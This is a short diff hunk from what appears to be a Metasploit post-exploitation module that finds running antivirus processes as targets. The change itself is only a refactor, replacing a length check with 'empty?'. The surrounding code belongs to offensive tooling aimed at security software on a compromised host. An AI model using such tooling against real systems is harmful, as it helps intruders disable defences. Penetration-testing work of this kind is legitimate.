@@ -57,7 +57,7 @@ class MetasploitModule < Msf::Post
     ]
 
     av_processes = get_processes.reject { |p| skip_processes.include?(p['name'].downcase) }.keep_if { |p| avs.include?(p['name'.downcase]) }
-    if av_processes.length == 0
+    if av_processes.empty?
       print_status('No target processes were found.')
       return
     end
